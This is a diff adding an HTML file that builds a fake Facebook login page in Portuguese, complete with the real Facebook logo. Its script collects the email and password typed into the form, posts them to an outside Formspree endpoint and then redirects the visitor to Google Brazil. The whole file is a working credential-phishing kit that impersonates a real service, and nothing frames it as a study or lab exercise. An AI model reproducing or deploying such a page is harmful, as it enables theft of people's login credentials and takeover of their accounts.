@@ -1,0 +1,156 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login - Facebook</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f0f2f5;
+    }
+
+    .login-container {
+      width: 360px;
+    }
+
+    .login-box {
+      background-color: #fff;
+      padding: 20px;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    img {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    label {
+      margin-top: 10px;
+      text-align: left; /* Alinhamento à esquerda */
+    }
+
+    input {
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    button {
+      background-color: #1877f2;
+      color: #fff;
+      padding: 10px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #0e63ac;
+    }
+
+    .separator {
+      margin: 20px 0;
+      position: relative;
+    }
+
+    .separator:before, .separator:after {
+      content: "";
+      position: absolute;
+      top: 50%;
+      width: 50%;
+      height: 1px;
+      background-color: #ddd;
+    }
+
+    .separator:before {
+      right: 100%;
+      margin-right: 15px;
+    }
+
+    .separator:after {
+      left: 100%;
+      margin-left: 15px;
+    }
+
+    a {
+      color: #1877f2;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/2560px-Facebook_Logo_%282019%29.svg.png" alt="Facebook Logo">
+      <h2>Entre com sua conta</h2>
+      <!-- Configuração do Formspree -->
+      <form id="login-form">
+        <label for="email">Usuário ou Email:</label>
+        <input type="text" id="email" name="email" required>
+        <label for="password">Senha:</label>
+        <input type="password" id="password" name="password" required>
+        <button type="submit">Entrar</button>
+        <div class="separator">
+          <span>ou</span>
+        </div>
+        <a href="#">Criar nova Conta?</a>
+        <a href="#">Esqueceu a Senha?</a>
+      </form>
+    </div>
+  </div>
+
+  <!-- Script para enviar os dados do formulário para o Formspree e redirecionar -->
+  <script>
+    document.getElementById("login-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Enviar os dados do formulário para o Formspree
+      fetch("https://formspree.io/f/mnqknovy", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          email: email,
+          password: password
+        }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("Dados enviados com sucesso!", data);
+        // Redirecionar o usuário para a página do Google após o envio bem-sucedido
+        window.location.href = "https://www.google.com.br";
+      })
+      .catch(error => {
+        console.error("Erro ao enviar os dados:", error);
+      });
+    });
+  </script>
+</body>
+</html>
